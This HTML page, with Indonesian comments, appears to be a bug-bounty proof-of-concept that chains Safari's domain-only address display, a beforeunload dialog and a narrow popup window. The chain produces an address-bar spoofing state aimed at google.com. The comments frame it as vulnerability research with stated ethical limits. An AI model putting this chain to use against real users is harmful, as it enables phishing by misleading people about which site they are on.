<!-- 49 | ⭐⭐ RANTAI — menggabungkan tiga primitif terkuat jadi satu skenario | [1-CLICK]
     Satu primitif jarang cukup. Yang dibayar adalah RANTAI, karena tiap mata rantai menutup
     salah satu jalan pengguna membantahmu.
     TIGA YANG DIRANGKAI, dan alasan tiap-tiapnya:
       (1) 18 · Safari menampilkan HANYA domain  -> permukaan yang harus dikalahkan tinggal
                satu string pendek; tak ada skema/path/query yang tersisa untuk membantah
       (2) 13 · dialog beforeunload              -> bar berganti ke tujuan, DAN pengguna
                terkunci di dialog sehingga tak bisa memeriksa apa pun selama itu
       (3) 25 · jendela sempit                   -> label domain terpotong, sisa teksnya
                makin sedikit untuk dibaca
     Ketiganya dipasang berurutan di satu jendela, dan tiap tahap mencetak apa yang harus
     kamu amati. Kalau rantai ini menghasilkan keadaan "layar menampilkan halaman ini,
     bar menulis lain, pengguna tak bisa memeriksa" — itu laporan penuh, bukan satu temuan kecil.
     ETIKA  jendela & origin milikmu; konten netral; tak ada form, tak ada beacon, tak ada
     peniruan merek. Tutup dialog kapan saja untuk keluar. -->
<h2 style="font:20px system-ui">HALAMAN PENYERANG — perhatikan ia tidak pernah hilang</h2>
<button onclick="go()">Jalankan rantai</button>
<pre id=g style="font:12px/1.7 monospace"></pre>
<script>
var T = 'https://www.google.com/';
g.textContent = 'REAL ORIGIN: ' + location.href + '\n\nKlik untuk merangkai 3 tahap.';
function go() {
  var w = window.open(location.href + '?tahap=2', 'rantai', 'width=300,height=380,left=80,top=80');
  if (!w) { g.textContent = 'popup diblokir — izinkan popup untuk situs ini.'; return; }
  g.textContent = 'REAL ORIGIN: ' + location.origin +
    '\n\nTAHAP 1 selesai — jendela sempit (300px) dibuka.' +
    '\n  amati: label domain di jendela itu terpotong?' +
    '\n\nTAHAP 2 berjalan di jendela itu (dialog + navigasi).' +
    '\n  amati di jendela sempit tsb:' +
    '\n   a. bar menulis apa saat dialog muncul?' +
    '\n   b. bisakah kamu mengklik bar-nya selagi dialog terbuka?' +
    '\n   c. layar menampilkan halaman siapa?' +
    '\n\nSatu screenshot yang memuat ketiganya = laporan.';
}
if (new URLSearchParams(location.search).get('tahap') === '2') {
  document.body.innerHTML = '<div style="font:14px system-ui;padding:14px">' +
    '<b>Jendela sempit.</b><p style="font:12px monospace">origin asli: ' + location.origin + '</p>' +
    '<p style="font:12px">bar di atas menulis apa?</p></div>';
  addEventListener('beforeunload', function (e) { e.preventDefault(); e.returnValue = ''; return ''; });
  setTimeout(function () { location.href = T; }, 1500);
}
</script>
